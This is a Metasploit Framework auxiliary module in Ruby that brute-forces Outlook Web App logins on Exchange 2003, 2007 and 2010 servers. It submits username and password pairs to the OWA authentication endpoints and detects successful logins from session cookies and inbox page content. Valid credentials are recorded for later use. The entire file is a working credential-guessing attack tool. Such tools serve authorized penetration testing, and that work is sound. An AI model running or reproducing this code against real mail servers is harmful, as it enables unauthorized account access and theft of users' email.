##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute
	include Msf::Exploit::Remote::HttpClient

	def initialize
		super(
			'Name'           => 'Outlook Web App (OWA) Brute Force Utility',
			'Description'    => %q{
				This module tests credentials on OWA 2003, 2007 and 2010 servers.
			},
			'Author'         =>
				[
					'Vitor Moreira',
					'Spencer McIntyre',
					'SecureState R&D Team'
				],
			'License'        => MSF_LICENSE
		)

		register_options(
			[
				OptInt.new('RPORT', [ true, "The target port", 443]),
				OptString.new('VERSION', [ true, "OWA VERSION (2003, 2007, or 2010)", '2007'])
			], self.class)

		register_advanced_options(
			[
				OptString.new('AD_DOMAIN', [ false, "Optional AD domain to prepend to usernames", '']),
				OptBool.new('SSL', [ true, "Negotiate SSL for outgoing connections", true])
			], self.class)

		deregister_options('BLANK_PASSWORDS')
	end

	def run
		datastore['BLANK_PASSWORDS'] = false  # OWA doesn't support blank passwords
		vhost = datastore['VHOST'] || datastore['RHOST']

		if datastore['VERSION'] == '2003'
			authPath = '/exchweb/bin/auth/owaauth.dll'
			inboxPath = '/exchange/'
			loginCheck = /Inbox/
		elsif datastore['VERSION'] == '2007'
			authPath = '/owa/auth/owaauth.dll'
			inboxPath = '/owa/'
			loginCheck = /addrbook.gif/
		elsif datastore['VERSION'] == '2010'
			authPath = '/owa/auth.owa'  # Post creds here
			inboxPath = '/owa/'         # Get request with cookie/sessionid
			loginCheck = /Inbox|A mailbox couldn\'t be found/        # check result
		else
			print_error('Invalid VERSION, select one of 2003, 2007, or 2010')
			return
		end

		print_status("#{msg} Testing version #{datastore['VERSION']}")

		begin
			each_user_pass do |user, pass|
				vprint_status("#{msg} Trying #{user} : #{pass}")
				try_user_pass(user, pass, authPath, inboxPath, loginCheck, vhost)
			end
		rescue ::Rex::ConnectionError, Errno::ECONNREFUSED
			print_error("#{msg} HTTP Connection Error, Aborting")
		end
	end

	def try_user_pass(user, pass, authPath, inboxPath, loginCheck, vhost)
		user = datastore['AD_DOMAIN'] + '\\' + user if datastore['AD_DOMAIN'] != ''
		headers = {
			'Cookie' => 'PBack=0'
		}

		if (datastore['SSL'].to_s.match(/^(t|y|1)/i))
			data = 'destination=https://' << vhost << '&flags=0&trusted=0&username=' << user << '&password=' << pass
		else
			data = 'destination=http://' << vhost << '&flags=0&trusted=0&username=' << user << '&password=' << pass
		end

		begin
			res = send_request_cgi({
				'encode'   => true,
				'uri'      => authPath,
				'method'   => 'POST',
				'headers'  => headers,
				'data'     => data
			}, 20)

		rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
			print_error("#{msg} HTTP Connection Failed, Aborting")
			return :abort
		end

		if not res
			print_error("#{msg} HTTP Connection Error, Aborting")
			return :abort
		end

		if not res.headers['set-cookie']
			print_error("#{msg} Received invalid repsonse due to a missing cookie (possibly due to invalid version), aborting")
			return :abort
		end

		# these two lines are the authentication info
		sessionid = 'sessionid=' << res.headers['set-cookie'].split('sessionid=')[1].split('; ')[0]
		cadata = 'cadata=' << res.headers['set-cookie'].split('cadata=')[1].split('; ')[0]

		headers['Cookie'] = 'PBack=0; ' << sessionid << '; ' << cadata

		begin
			res = send_request_cgi({
				'uri'       => inboxPath,
				'method'    => 'GET',
				'headers'   => headers
			}, 20)
		rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
			print_error("#{msg} HTTP Connection Failed, Aborting")
			return :abort
		end

		if not res
			print_error("#{msg} HTTP Connection Error, Aborting")
			return :abort
		end

		if res.code == 302
			vprint_error("#{msg} FAILED LOGIN. '#{user}' : '#{pass}'")
			return :skip_pass
		end

		if res.body =~ loginCheck
			print_good("#{msg} SUCCESSFUL LOGIN. '#{user}' : '#{pass}'")

			report_hash = {
				:host   => datastore['RHOST'],
				:port   => datastore['RPORT'],
				:sname  => 'owa',
				:user   => user,
				:pass   => pass,
				:active => true,
				:type => 'password'}

			report_auth_info(report_hash)
			return :next_user
		else
			vprint_error("#{msg} FAILED LOGIN. '#{user}' : '#{pass}'")
			return :skip_pass
		end
	end

	def msg
		"#{vhost}:#{rport} OWA -"
	end

end
